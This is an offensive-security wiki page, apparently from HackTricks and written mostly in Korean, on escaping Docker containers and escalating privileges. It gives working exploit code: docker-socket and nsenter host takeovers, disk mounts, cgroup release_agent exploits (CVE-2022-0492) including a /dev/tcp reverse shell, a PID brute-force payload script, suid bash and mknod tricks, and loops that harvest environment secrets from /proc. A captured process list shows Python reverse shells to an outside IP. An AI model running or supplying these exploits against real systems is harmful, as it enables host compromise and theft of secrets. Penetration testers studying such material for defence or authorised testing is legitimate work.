# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## 자동 열거 및 탈출

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 컨테이너를 **열거할 수 있습니다**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 이 도구는 당신이 있는 컨테이너를 **열거하고 자동으로 탈출을 시도하는 데 유용합니다**
- [**amicontained**](https://github.com/genuinetools/amicontained): 탈출 방법을 찾기 위해 컨테이너가 가진 권한을 얻는 데 유용한 도구
- [**deepce**](https://github.com/stealthcopter/deepce): 컨테이너에서 열거하고 탈출하는 도구
- [**grype**](https://github.com/anchore/grype): 이미지에 설치된 소프트웨어에 포함된 CVE를 가져옵니다

## 마운트된 Docker 소켓 탈출

어떤 방법으로든 **docker 소켓이** 도커 컨테이너 내부에 마운트되어 있다면, 당신은 그곳에서 탈출할 수 있습니다.\
이는 일반적으로 어떤 이유로 도커 데몬에 연결해야 하는 도커 컨테이너에서 발생합니다.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
이 경우 일반적인 docker 명령어를 사용하여 docker 데몬과 통신할 수 있습니다:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> **docker 소켓이 예상치 못한 위치에 있는 경우**에도 **`docker`** 명령어와 매개변수 **`-H unix:///path/to/docker.sock`**를 사용하여 여전히 통신할 수 있습니다.

Docker 데몬은 또한 [포트에서 수신 대기할 수 있습니다 (기본값 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) 또는 Systemd 기반 시스템에서는 Systemd 소켓 `fd://`를 통해 Docker 데몬과 통신할 수 있습니다.

> [!NOTE]
> 추가로, 다른 고급 런타임의 런타임 소켓에 주의하십시오:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Capabilities Abuse Escape

컨테이너의 권한을 확인해야 하며, 다음 중 하나라도 있다면 탈출할 수 있을 것입니다: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

현재 컨테이너 권한을 확인하려면 **앞서 언급한 자동 도구**를 사용하거나:
```bash
capsh --print
```
다음 페이지에서 **리눅스 기능에 대해 더 알아보고** 이를 악용하여 권한을 탈출/상승시키는 방법을 배울 수 있습니다:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 특권 컨테이너에서 탈출

특권 컨테이너는 `--privileged` 플래그를 사용하거나 특정 방어 기능을 비활성화하여 생성할 수 있습니다:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

`--privileged` 플래그는 컨테이너 보안을 크게 낮추며, **제한 없는 장치 접근**을 제공하고 **여러 보호 기능**을 우회합니다. 자세한 내용은 `--privileged`의 전체 영향에 대한 문서를 참조하십시오.

{{#ref}}
../docker-privileged.md
{{#endref}}

### 특권 + hostPID

이 권한으로 **루트로 호스트에서 실행 중인 프로세스의 네임스페이스로 이동**할 수 있습니다. 예를 들어 init (pid:1)에서 다음을 실행하면 됩니다: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

컨테이너에서 다음을 실행하여 테스트하십시오:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

privileged 플래그만으로도 **호스트의 디스크에 접근**하거나 **release_agent 또는 다른 탈출 기법을 악용하여 탈출**을 시도할 수 있습니다.

다음 우회 방법을 컨테이너에서 실행하여 테스트하십시오:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### 디스크 마운트 - Poc1

잘 구성된 도커 컨테이너는 **fdisk -l**과 같은 명령을 허용하지 않습니다. 그러나 `--privileged` 또는 `--device=/dev/sda1` 플래그가 지정된 잘못 구성된 도커 명령에서는 호스트 드라이브를 볼 수 있는 권한을 얻는 것이 가능합니다.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

따라서 호스트 머신을 장악하는 것은 사소한 일입니다:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
그리고 voilà! 이제 `/mnt/hola` 폴더에 마운트되어 있기 때문에 호스트의 파일 시스템에 접근할 수 있습니다.

#### 디스크 마운트 - Poc2

컨테이너 내에서 공격자는 클러스터에 의해 생성된 쓰기 가능한 hostPath 볼륨을 통해 기본 호스트 OS에 대한 추가 접근을 시도할 수 있습니다. 아래는 이 공격 벡터를 활용할 수 있는지 확인하기 위해 컨테이너 내에서 확인할 수 있는 몇 가지 일반적인 사항입니다:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 권한 상승 기존 release_agent 악용 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
다음은 기술에 대한 **설명**입니다:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### 권한 상승: 상대 경로를 모르는 release_agent 악용 - PoC3

이전의 익스플로잇에서는 **호스트 파일 시스템 내의 컨테이너의 절대 경로가 공개됩니다**. 그러나 항상 그런 것은 아닙니다. 호스트 내의 컨테이너의 **절대 경로를 모르는 경우** 이 기술을 사용할 수 있습니다:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
특권 컨테이너 내에서 PoC를 실행하면 다음과 유사한 출력이 제공되어야 합니다:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 권한 상승: 민감한 마운트 악용

여러 파일이 마운트될 수 있으며, 이는 **기본 호스트에 대한 정보를 제공합니다**. 이 중 일부는 **호스트에서 무언가가 발생할 때 실행될 수 있는 무언가를 나타낼 수 있습니다** (이는 공격자가 컨테이너에서 탈출할 수 있게 합니다).\
이 파일의 악용은 다음을 허용할 수 있습니다:

- release_agent (이전에 다룸)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

그러나 이 페이지에서 확인할 수 있는 **다른 민감한 파일**을 찾을 수 있습니다:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### 임의 마운트

여러 경우에 **컨테이너가 호스트에서 일부 볼륨을 마운트하고 있는 것을 발견할 수 있습니다**. 이 볼륨이 올바르게 구성되지 않았다면 **민감한 데이터에 접근/수정할 수 있을지도 모릅니다**: 비밀 읽기, ssh authorized_keys 변경…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

컨테이너 내에서 **root로 접근**할 수 있고 호스트에서 일부 폴더가 마운트되어 있으며 **비특권 사용자로 호스트에 탈출**하고 마운트된 폴더에 대한 읽기 권한이 있는 경우,\
컨테이너 내의 **마운트된 폴더**에 **bash suid 파일**을 생성하고 **호스트에서 실행**하여 권한 상승을 할 수 있습니다.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

컨테이너 내에서 **root로 접근할 수** 있고 **비특권 사용자로 호스트에 탈출했다면**, 두 개의 셸을 악용하여 **호스트 내에서 privesc를 수행할 수** 있습니다. 컨테이너 내에서 MKNOD 권한이 있는 경우(기본적으로 있음) [**이 게시물에서 설명된 대로**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)입니다.\
이러한 권한을 통해 컨테이너 내의 root 사용자는 **블록 장치 파일을 생성할 수** 있습니다. 장치 파일은 **기본 하드웨어 및 커널 모듈에 접근하는 데 사용되는 특수 파일**입니다. 예를 들어, /dev/sda 블록 장치 파일은 **시스템 디스크의 원시 데이터를 읽는 데 접근을 제공합니다**.

Docker는 cgroup 정책을 시행하여 컨테이너 내에서 블록 장치 오용을 방지하며, **블록 장치 읽기/쓰기 작업을 차단합니다**. 그럼에도 불구하고, 블록 장치가 **컨테이너 내에서 생성되면**, **/proc/PID/root/** 디렉토리를 통해 컨테이너 외부에서 접근할 수 있게 됩니다. 이 접근은 **프로세스 소유자가 컨테이너 내부와 외부에서 동일해야** 합니다.

**Exploitation** 예시는 이 [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)에서 확인할 수 있습니다:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

호스트의 프로세스에 접근할 수 있다면, 해당 프로세스에 저장된 많은 민감한 정보에 접근할 수 있게 됩니다. 테스트 실험실을 실행하세요:
```
docker run --rm -it --pid=host ubuntu bash
```
예를 들어, `ps auxn`과 같은 명령어를 사용하여 프로세스를 나열하고 명령어에서 민감한 세부정보를 검색할 수 있습니다.

그런 다음, **/proc/에서 호스트의 각 프로세스에 접근할 수 있으므로 env 비밀을 훔칠 수 있습니다**:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
다른 프로세스의 파일 설명자에 **접근하고 열린 파일을 읽을 수 있습니다**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
당신은 또한 **프로세스를 종료하고 DoS를 유발할 수 있습니다**.

> [!WARNING]
> 만약 당신이 **컨테이너 외부의 프로세스에 대한 권한 있는 접근**을 가지고 있다면, `nsenter --target <pid> --all` 또는 `nsenter --target <pid> --mount --net --pid --cgroup`와 같은 명령을 실행하여 **해당 프로세스와 동일한 ns 제한**(바라건대 없음) **으로 셸을 실행할 수 있습니다.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
컨테이너가 Docker [호스트 네트워킹 드라이버 (`--network=host`)](https://docs.docker.com/network/host/)로 구성된 경우, 해당 컨테이너의 네트워크 스택은 Docker 호스트와 격리되지 않으며(컨테이너는 호스트의 네트워킹 네임스페이스를 공유함), 컨테이너는 자체 IP 주소를 할당받지 않습니다. 다시 말해, **컨테이너는 모든 서비스를 호스트의 IP에 직접 바인딩**합니다. 게다가 컨테이너는 **호스트가 공유 인터페이스 `tcpdump -i eth0`에서 송수신하는 모든 네트워크 트래픽을 가로챌 수 있습니다**.

예를 들어, 이를 사용하여 **호스트와 메타데이터 인스턴스 간의 트래픽을 스니핑하고 심지어 스푸핑**할 수 있습니다.

다음 예제와 같이:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

또한 호스트 내부의 **로컬호스트에 바인딩된 네트워크 서비스**에 접근하거나 **노드의 메타데이터 권한**에 접근할 수 있습니다(이는 컨테이너가 접근할 수 있는 것과 다를 수 있습니다).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true`를 사용하면 호스트의 프로세스 간 통신(IPC) 리소스에 접근할 수 있습니다. 예를 들어, `/dev/shm`의 **공유 메모리**와 같은 리소스입니다. 이는 동일한 IPC 리소스를 다른 호스트 또는 포드 프로세스가 사용할 때 읽기/쓰기가 가능하게 합니다. `ipcs`를 사용하여 이러한 IPC 메커니즘을 더 자세히 검사하십시오.

- **/dev/shm 검사** - 이 공유 메모리 위치에서 파일을 찾아보세요: `ls -la /dev/shm`
- **기존 IPC 시설 검사** – `/usr/bin/ipcs`를 사용하여 어떤 IPC 시설이 사용되고 있는지 확인할 수 있습니다. 다음과 같이 확인하세요: `ipcs -a`

### 권한 복구

시스템 호출 **`unshare`**가 금지되지 않은 경우, 모든 권한을 복구할 수 있습니다:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### 사용자 네임스페이스 악용을 통한 심볼릭 링크

게시물 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)에서 설명된 두 번째 기술은 사용자 네임스페이스와 함께 바인드 마운트를 악용하여 호스트 내부의 파일에 영향을 미치는 방법(특정 경우에는 파일 삭제)을 나타냅니다.

## CVE

### Runc 취약점 (CVE-2019-5736)

루트로 `docker exec`를 실행할 수 있는 경우(아마도 sudo를 사용하여), CVE-2019-5736을 악용하여 컨테이너에서 탈출하여 권한 상승을 시도합니다(취약점 [여기](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). 이 기술은 기본적으로 **컨테이너에서 호스트의 _**/bin/sh**_ 바이너리를 **덮어씁니다**, 따라서 docker exec를 실행하는 모든 사용자가 페이로드를 트리거할 수 있습니다.

페이로드를 적절히 변경하고 `go build main.go`로 main.go를 빌드합니다. 결과 바이너리는 실행을 위해 도커 컨테이너에 배치해야 합니다.\
실행 시 `[+] Overwritten /bin/sh successfully`가 표시되면 호스트 머신에서 다음을 실행해야 합니다:

`docker exec -it <container-name> /bin/sh`

이것은 main.go 파일에 있는 페이로드를 트리거합니다.

자세한 정보는: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> 컨테이너가 취약할 수 있는 다른 CVE도 있으며, [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)에서 목록을 찾을 수 있습니다.

## 도커 사용자 정의 탈출

### 도커 탈출 표면

- **네임스페이스:** 프로세스는 네임스페이스를 통해 **다른 프로세스와 완전히 분리되어야** 하므로, 네임스페이스로 인해 다른 프로세스와 상호작용하여 탈출할 수 없습니다(기본적으로 IPC, 유닉스 소켓, 네트워크 서비스, D-Bus, 다른 프로세스의 `/proc`를 통해 통신할 수 없음).
- **루트 사용자**: 기본적으로 프로세스를 실행하는 사용자는 루트 사용자입니다(그러나 권한은 제한적입니다).
- **권한**: 도커는 다음 권한을 남깁니다: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **시스템 호출**: **루트 사용자가 호출할 수 없는** 시스템 호출입니다(권한 부족 + Seccomp로 인해). 다른 시스템 호출은 탈출을 시도하는 데 사용될 수 있습니다.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
